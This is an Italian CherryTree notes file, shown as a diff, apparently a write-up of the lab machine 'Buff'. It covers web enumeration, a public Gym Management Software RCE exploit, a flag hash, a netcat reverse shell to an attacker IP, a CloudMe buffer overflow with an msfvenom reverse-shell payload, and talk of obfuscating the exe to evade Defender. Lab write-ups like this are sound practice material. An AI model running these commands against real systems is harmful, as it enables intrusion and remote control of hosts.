+				<rich_text> (CODE:403|SIZE:1044)                             
++ </rich_text>
+				<rich_text link="webs http://10.10.10.198:8080/img/aux">http://10.10.10.198:8080/img/aux</rich_text>
+				<rich_text> (CODE:403|SIZE:1044)                                      
++ </rich_text>
+				<rich_text link="webs http://10.10.10.198:8080/img/cachemgr.cgi">http://10.10.10.198:8080/img/cachemgr.cgi</rich_text>
+				<rich_text> (CODE:403|SIZE:1044)                             
++ </rich_text>
+				<rich_text link="webs http://10.10.10.198:8080/img/com1">http://10.10.10.198:8080/img/com1</rich_text>
+				<rich_text> (CODE:403|SIZE:1044)                                     
++ </rich_text>
+				<rich_text link="webs http://10.10.10.198:8080/img/com2">http://10.10.10.198:8080/img/com2</rich_text>
+				<rich_text> (CODE:403|SIZE:1044)                                     
++ </rich_text>
+				<rich_text link="webs http://10.10.10.198:8080/img/com3">http://10.10.10.198:8080/img/com3</rich_text>
+				<rich_text> (CODE:403|SIZE:1044)                                     
++ </rich_text>
+				<rich_text link="webs http://10.10.10.198:8080/img/con">http://10.10.10.198:8080/img/con</rich_text>
+				<rich_text> (CODE:403|SIZE:1044)                                      
++ </rich_text>
+				<rich_text link="webs http://10.10.10.198:8080/img/lpt1">http://10.10.10.198:8080/img/lpt1</rich_text>
+				<rich_text> (CODE:403|SIZE:1044)                                     
++ </rich_text>
+				<rich_text link="webs http://10.10.10.198:8080/img/lpt2">http://10.10.10.198:8080/img/lpt2</rich_text>
+				<rich_text> (CODE:403|SIZE:1044)                                     
++ </rich_text>
+				<rich_text link="webs http://10.10.10.198:8080/img/nul">http://10.10.10.198:8080/img/nul</rich_text>
+				<rich_text> (CODE:403|SIZE:1044)
+
+(continua)
+
+
+
+ci sono molte pagine, la maggior parte delle quali non sono accessibili
+
+1)se si prova ad accedere a una pagina inaccessibile è possibile ottenere l'indirizzo email del webmaster: 
+postmaster@localhost (quella di default per gli errori)
+
+2) cercando di accedere a </rich_text>
+				<rich_text link="webs http://10.10.10.198:8080/profile/">http://10.10.10.198:8080/profile/</rich_text>
+				<rich_text>  si ottiene un errore:
+</rich_text>
+				<rich_text weight="heavy">Parse error</rich_text>
+				<rich_text>:  syntax error, unexpected '&lt;' in </rich_text>
+				<rich_text weight="heavy">C:\xampp\htdocs\gym\profile\index.php</rich_text>
+				<rich_text> on line </rich_text>
+				<rich_text weight="heavy">87</rich_text>
+				<rich_text>
+
+
+3)si può vedere però che c'è una copia delsito più vecchia, sotto  </rich_text>
+				<rich_text link="webs http://10.10.10.198:8080/ex/">http://10.10.10.198:8080/ex/</rich_text>
+				<rich_text>
+nella pagina principale c'è l'errore:
+
+</rich_text>
+				<rich_text weight="heavy">Warning</rich_text>
+				<rich_text>:  mysqli::__construct(): (HY000/1049): Unknown database 'secure_login' in </rich_text>
+				<rich_text weight="heavy">C:\xampp\htdocs\gym\ex\include\db_connect.php</rich_text>
+				<rich_text> on line </rich_text>
+				<rich_text weight="heavy">3</rich_text>
+				<rich_text>
+
+
+4) andando a </rich_text>
+				<rich_text link="webs http://10.10.10.198:8080/contact.php">http://10.10.10.198:8080/contact.php</rich_text>
+				<rich_text> c'è:
+
+Made using Gym Management Software 1.0
+
+
+
+    
+
+
+
+
+
+
+</rich_text>
+			</node>
+		</node>
+		<node custom_icon_id="0" foreground="" is_bold="False" name="Foothold" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1597770789.23" ts_lastsave="1598781816.83" unique_id="5">
+			<rich_text>Esiste un exploit per Gym Management Software 1.0 (Unauthenticated Remote Code Execution):
+</rich_text>
+			<rich_text link="webs https://www.exploit-db.com/exploits/48506">https://www.exploit-db.com/exploits/48506</rich_text>
+			<rich_text>
+
+eseguendo l'exploit usando 
+
+python2 48506.py </rich_text>
+			<rich_text link="webs http://10.10.10.198:8080/">http://10.10.10.198:8080/</rich_text>
+			<rich_text>
+
+e usando come file da caricare kamehameha.php (una shell) si ottiene un terminale sull'host.
+
+
+con 
+
+type C:\Users\shaun\Desktop\user.txt
+
+si ottiene il flag di user:
+
+a7c5b0014dd0f8738e3f6d9a298fa2cf
+
+
+
+la command lline ottenuta comuinque non è una vera shell ma permette solo di leggere files ecc
+quindi si deve ottenre una shell completa, “reale”
+
+
+per farlo il modo più semplice è caricare nc.exe (netcat) sul server buff:
+
+1- fai partire server tramite python oin locale (nella dir che contiene nc.exe, oppure si deve specificare tutto il path dopo)
+        sudo python -m SimpleHTTPServer 80
+2- su macchina target, usa curl (o wget) per ottenere il file dal server startato:
+        curl -o ncm.exe </rich_text>
+			<rich_text link="webs http://10.10.14.48/nc.exe">http://10.10.14.59/nc.exe</rich_text>
+			<rich_text>       //ho messo ncm.exe come nome del file scaricato ma va benequalunque cosa
+
+
+ora basta attivare il listener e collegarsi:
+
+1- su macchina locale far partire netcat:
+      nc -lvnp 4444
+2- su target eseguire:
+      nc.exe -e cmd.exe &lt;Attacker_IP&gt; &lt;PORT&gt;    //nc.exe -e cmd.exe 10.10.14.59 4444
+      
+A questo punto avremo una shell sull'host
+
+
+</rich_text>
+		</node>
+		<node custom_icon_id="0" foreground="" is_bold="False" name="privesc" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1598781816.83" ts_lastsave="1598804388.23" unique_id="6">
+			<rich_text>utilizzando il comando 
+
+tasklist
+
+si vedono tutti i processi attivi in windows, uno interessante è:
+CloudMe.exe
+
+facendo enumeration e andando in C:\Users\shaun\Downloads
+si trova l'eseguibile CloudMe_1112.exe che ci dice la versione del software che è in esecuzione, questa versione è vulnerabile ad un exploit di buffer overflow: 
+</rich_text>
+			<rich_text link="webs https://packetstormsecurity.com/files/157407/CloudMe-1.11.2-Buffer-Overflow.html">https://packetstormsecurity.com/files/157407/CloudMe-1.11.2-Buffer-Overflow.html</rich_text>
+			<rich_text>
+
+al momento il payload presente nell'exploit fa semplicemente partire la calcolatrice, per ottenere una nuova reverse shell si deve rigenerare il payload tramite msfvenom:
+
+msfvenom -a x86 -p windows/exec CMD=&quot;C:\xampp\htdocs\gym\upload\nc.exe -e cmd.exe 10.10.14.59 4445&quot; -b '\x00\x0A\x0D' -f python &gt; shellcode.txt
+
+(sfrutto di nuovo nc.exe visto che già c'è)
+
+non funziona perchè non riesce a collegarsi a buff.
+
+Seconda strada: eseguire lo script sulla macchina direttamente e usare come shellcode semplicemente “cmd.exe”,
+come python non si riesce ad eseguire perchè non c'è sulla macchina, quindi si deve convertire a .exe:
+
+1) trasferire file .py su windows (forse non necessario)
+2) pip install pyinstaller
+3) pyinstaller --onefile -w “nomescript.py”
+
+Il file è stato rilevato da security defender che è in esecuzione anche sulla macchina buff quindi forse è necessario offuscarlo</rich_text>
+		</node>
+	</node>
+</cherrytree>
